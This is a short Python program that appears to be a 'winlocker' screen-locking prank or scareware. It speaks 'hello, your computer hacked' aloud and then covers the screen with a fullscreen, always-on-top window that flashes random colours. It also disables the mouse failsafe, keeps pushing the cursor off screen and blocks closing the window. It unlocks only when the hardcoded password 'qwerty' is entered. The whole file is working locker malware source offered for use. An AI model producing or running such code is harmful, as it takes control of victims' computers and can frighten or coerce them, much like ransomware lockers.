import pygame,random,time,os
from tkinter import *
from tkinter import messagebox
import pyautogui as pyg
from PIL import ImageTk, Image
from pygame import mixer
from gtts import gTTS

def say(ss):
	mp3_name = "1.mp3"
	mixer.init()
	tts=gTTS(text=ss, lang='en')         
	tts.save(mp3_name)
	sound=open(mp3_name, 'rb')
	mixer.music.load(sound)
	mixer.music.play()
	while mixer.music.get_busy():
		time.sleep(0.5)
	mixer.stop()
	mixer.quit()
	sound.close()
	os.remove(mp3_name)
say('hello, your computer hacked')
pyg.FAILSAFE=False
large_font = ('Arial',30)
password="qwerty" #your password
addimage=True #without image - crushing
input=""
messagebox.showinfo("oops",'i can lock your computer')
tk=Tk()
tk.attributes("-fullscreen",True)
tk.attributes('-topmost', 1)
field=Entry(tk,width=50,font=large_font)
text = Label(tk,text='winlocker!!! \n windows blocked, put password',font="Arial 50")
text.pack()
field.pack()
if addimage==True:
        pathq = "test.jpg" 
        imgq = ImageTk.PhotoImage(Image.open(pathq),master = tk)
        panelq = Label(tk, image = imgq)
        panelq.pack(side = "bottom", expand = "yes")
tk.update()
def check():
	pyg.moveTo(x=10920,y=10080)
	tk.protocol('WM_DELETE_WINDOW',check)
	tk.lift()
	field.focus()
	exitt()
def exitt():
        input = field.get()
        if input==password:
                tk.destroy()
while 1==1:
        r = lambda: random.randint(0,255)
        a='#%02X%02X%02X' % (r(),r(),r())#random color generator
        tk.configure(background=a)
        text.configure(background=a)
        tk.update()
        check()
        time.sleep(0.005)

